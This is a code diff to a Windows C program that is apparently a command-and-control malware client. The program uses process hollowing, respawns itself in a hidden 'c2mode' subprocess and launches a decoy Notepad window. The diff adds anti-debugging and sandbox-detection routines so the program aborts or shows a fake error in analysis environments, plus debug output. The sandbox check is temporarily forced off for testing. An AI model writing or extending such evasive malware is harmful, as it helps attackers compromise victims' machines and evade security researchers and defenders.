@@ -6,6 +6,7 @@
 #include <ws2tcpip.h>
 #include <winternl.h>
 #include "antidebug.h"
+#include "checksandbox.h"
 
 #pragma comment(lib, "ws2_32.lib")
 
@@ -213,7 +214,37 @@ BOOL ProcessHollowing(const char* targetPath, unsigned char* payload, size_t pay
 
 // Modified C2 client function with process hollowing
 void run_c2_client() {
+    // ===== SECURITY CHECKS - ADD THIS SECTION =====
+    printf("\n========================================\n");
+    printf("PERFORMING ANTI-DEBUG CHECKS\n");
+    printf("========================================\n");
     InitAntiDebug();
+    
+    // Test some API calls to verify monitoring is working
+    SafeGetSystemTime();
+    SafeGetModuleHandle();
+    SafeIsDebuggerPresent();
+    
+    // SANDBOX CHECK
+    printf("\n========================================\n");
+    printf("PERFORMING SANDBOX DETECTION\n");
+    printf("========================================\n");
+    int sandbox_result = check_sandbox();
+
+    // For testing, force no sandbox detected, comment if detection wanted
+    sandbox_result = 0;  
+    
+    if (sandbox_result) {
+        printf("\n[CRITICAL] SANDBOX DETECTED! Terminating...\n");
+        PrintAntiDebugStats();
+        Sleep(2000);
+        exit(-1);
+    }
+    
+    printf("\n[OK] Environment checks passed\n");
+    printf("========================================\n\n");
+    PrintAntiDebugStats();
+    // ===== END OF SECURITY CHECKS =====
     
     SOCKET sock, server_sock, client_sock;
     struct sockaddr_in server_addr, client_addr, listen_addr;
@@ -387,6 +418,8 @@ void run_c2_client() {
     WSACleanup();
 }
 
+
+
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     // Check if we're running as the C2 client subprocess
     if (lpCmdLine && strstr(lpCmdLine, "c2mode") != NULL) {
@@ -401,6 +434,43 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         return 0;
     }
     
+    // ===== LAUNCHER MODE SECURITY CHECKS - ADD THIS SECTION =====
+    AllocConsole();
+    freopen("CONOUT$", "w", stdout);
+    freopen("CONOUT$", "w", stderr);
+    
+    printf("\n========================================\n");
+    printf("LAUNCHER MODE - SECURITY CHECKS\n");
+    printf("========================================\n");
+    
+    InitAntiDebug();
+    
+    printf("\n--- Testing Anti-Debug Monitoring ---\n");
+    SafeGetSystemTime();
+    SafeGetComputerName();
+    SafeGetCurrentProcessId();
+    
+    printf("\n--- Running Sandbox Detection ---\n");
+    int sandbox_result = check_sandbox();
+
+    // For testing, force no sandbox detected, comment if detection wanted
+    sandbox_result = 0;
+    
+    if (sandbox_result) {
+        printf("\n[CRITICAL] SANDBOX DETECTED IN LAUNCHER! Aborting...\n");
+        PrintAntiDebugStats();
+        MessageBox(NULL, "Application cannot run in this environment", "Error", MB_OK | MB_ICONERROR);
+        Sleep(3000);
+        return -1;
+    }
+    
+    printf("\n[OK] Launcher environment checks passed\n");
+    printf("========================================\n\n");
+    PrintAntiDebugStats();
+    
+    Sleep(2000);  // Give user time to see results
+    // ===== END OF SECURITY CHECKS =====
+    
     // Main launcher mode
     STARTUPINFO si_c2 = {sizeof(si_c2)};
     PROCESS_INFORMATION pi_c2;
@@ -413,17 +483,23 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     char cmdLine[MAX_PATH + 20];
     snprintf(cmdLine, sizeof(cmdLine), "\"%s\" c2mode", exePath);
     
+    printf("Launching C2 client subprocess...\n");
+    
     if (CreateProcess(
         NULL, cmdLine,
         NULL, NULL, FALSE,
         0, NULL, NULL,
         &si_c2, &pi_c2
     )) {
+        printf("C2 client subprocess created successfully\n");
         CloseHandle(pi_c2.hProcess);
         CloseHandle(pi_c2.hThread);
+    } else {
+        printf("Failed to create C2 client subprocess\n");
     }
     
     // Launch notepad as decoy
+    printf("Launching decoy notepad...\n");
     STARTUPINFO si = {sizeof(si)};
     PROCESS_INFORMATION pi;
     
@@ -434,9 +510,12 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     );
     
     if (pi.hProcess) {
+        printf("Decoy notepad launched\n");
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
     }
     
     return 0;
 }
+
+
